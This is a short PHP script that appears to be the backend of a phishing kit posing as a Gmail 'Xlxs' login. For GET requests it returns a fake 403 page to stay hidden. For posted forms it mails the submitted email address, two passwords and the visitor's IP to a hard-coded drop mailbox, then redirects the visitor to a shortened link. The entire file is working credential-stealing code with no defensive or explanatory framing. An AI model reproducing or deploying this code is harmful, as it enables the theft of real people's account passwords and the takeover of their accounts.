<?
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}
$rezmail1 = "woogt@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------------------------------------\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";
$message .= "pass2: ".$_POST['password2']."\n";
$message .= "---------------------Created by Nakedwire------------------------------\n";
$subject = "Gmail Xlxs email+pass :) $ip";
$headers .= "MIME-Version: 1.0\n";
mail($rezmail1,$subject,$message,$headers);
Header ("Location: http://bit.ly/2b55OEx");
?>